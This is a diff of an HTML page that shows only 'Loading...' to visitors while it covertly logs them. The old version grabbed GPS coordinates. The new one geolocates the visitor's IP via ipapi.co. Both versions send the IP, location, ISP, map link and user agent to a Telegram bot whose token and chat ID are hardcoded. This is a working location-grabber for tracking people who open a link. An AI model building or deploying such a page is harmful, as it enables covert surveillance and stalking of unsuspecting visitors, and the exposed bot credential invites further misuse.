@@ -1,65 +1,61 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>GPS Location Logger</title>
+    <title>IP Location Logger</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
 </head>
 <body>
     <h1>Loading...</h1>
     <script>
-        // IP लिने
         fetch('https://api.ipify.org?format=json')
             .then(res => res.json())
             .then(data => {
                 const ip = data.ip;
                 const ua = navigator.userAgent;
 
-                // GPS Location (WhatsApp जस्तै)
-                if (navigator.geolocation) {
-                    navigator.geolocation.getCurrentPosition(
-                        (position) => {
-                            const lat = position.coords.latitude;
-                            const lon = position.coords.longitude;
-                            const acc = position.coords.accuracy; // meters
+                // IP बाट Location लिने (ip-api.com)
+                fetch(`https://ipapi.co/${ip}/json/`)
+                    .then(res => res.json())
+                    .then(locData => {
+                        const lat = locData.latitude || '';
+                        const lon = locData.longitude || '';
+                        const city = locData.city || '';
+                        const region = locData.region || '';
+                        const country = locData.country_name || '';
+                        const isp = locData.org || '';
 
-                            const mapLink = `https://www.google.com/maps/place/${lat},${lon}`;
-                            const msg = `📍 **GPS Location (Exact)**\nIP: ${ip}\nLat: ${lat}\nLon: ${lon}\nAccuracy: ${acc} meters\n🗺️ Maps: ${mapLink}\nUA: ${ua}`;
+                        let location = `${country}, ${city} (${isp})`;
+                        let mapLink = `https://www.google.com/maps/place/${lat},${lon}`;
 
-                            // Telegram Bot मा पठाउने
-                            const botToken = '8693973243:AAH1Iu_J_XDhbWOh9JCHWDuRgtW84YKF81I';
-                            const chatId = '8621764137';
+                        const msg = `📍 **IP Location (Exact)**\nIP: ${ip}\nLocation: ${location}\n🗺️ Maps: ${mapLink}\nUA: ${ua}`;
 
-                            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                                method: 'POST',
-                                headers: { 'Content-Type': 'application/json' },
-                                body: JSON.stringify({
-                                    chat_id: chatId,
-                                    text: msg,
-                                    parse_mode: 'Markdown'
-                                })
+                        const botToken = '8693973243:AAH1Iu_J_XDhbWOh9JCHWDuRgtW84YKF81I';
+                        const chatId = '8621764137';
+
+                        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({
+                                chat_id: chatId,
+                                text: msg,
+                                parse_mode: 'Markdown'
                             })
-                            .then(() => {
-                                document.body.innerHTML = `
-                                    <h2>✅ GPS Location Sent</h2>
-                                    <p><b>IP:</b> ${ip}</p>
-                                    <p><b>Latitude:</b> ${lat}</p>
-                                    <p><b>Longitude:</b> ${lon}</p>
-                                    <p><b>Accuracy:</b> ${acc} meters</p>
-                                    <p><b>Maps:</b> <a href="${mapLink}" target="_blank">${mapLink}</a></p>
-                                `;
-                            })
-                            .catch(() => {
-                                document.body.innerHTML = `<h2>❌ Telegram पठाउन सकिएन</h2><p>IP: ${ip}</p>`;
-                            });
-                        },
-                        (error) => {
-                            document.body.innerHTML = `<h2>❌ GPS Location लिन सकिएन</h2><p>Error: ${error.message}</p><p>IP: ${ip}</p>`;
-                        },
-                        { enableHighAccuracy: true }
-                    );
-                } else {
-                    document.body.innerHTML = `<h2>❌ GPS समर्थन छैन</h2><p>IP: ${ip}</p>`;
-                }
+                        })
+                        .then(() => {
+                            document.body.innerHTML = `
+                                <h2>✅ Location Sent</h2>
+                                <p><b>IP:</b> ${ip}</p>
+                                <p><b>Location:</b> ${location}</p>
+                                <p><b>Maps:</b> <a href="${mapLink}" target="_blank">${mapLink}</a></p>
+                            `;
+                        })
+                        .catch(() => {
+                            document.body.innerHTML = `<h2>❌ Failed to send</h2><p>IP: ${ip}</p>`;
+                        });
+                    })
+                    .catch(() => {
+                        document.body.innerHTML = `<h2>❌ Location fetch गर्न सकिएन</h2><p>IP: ${ip}</p>`;
+                    });
             })
             .catch(() => {
                 document.body.innerHTML = '<h2>❌ IP detect गर्न सकिएन</h2>';
